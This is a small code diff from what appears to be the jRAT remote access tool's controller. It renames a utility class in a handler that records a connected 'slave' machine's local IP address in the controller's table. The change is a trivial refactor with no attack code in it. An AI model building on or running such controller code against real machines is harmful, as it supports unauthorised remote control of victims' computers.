@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.Frame;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 public class Packet28InitLanAddress extends AbstractIncomingPacket {
@@ -14,7 +14,7 @@ public class Packet28InitLanAddress extends AbstractIncomingPacket {
 		String raw = slave.readLine();
 		slave.setLocalIP(raw);
 		
-		int row = Util.getRow(slave);
+		int row = Utils.getRow(slave);
 		
 		Frame.mainModel.setValueAt(raw, row, 8);
 	}
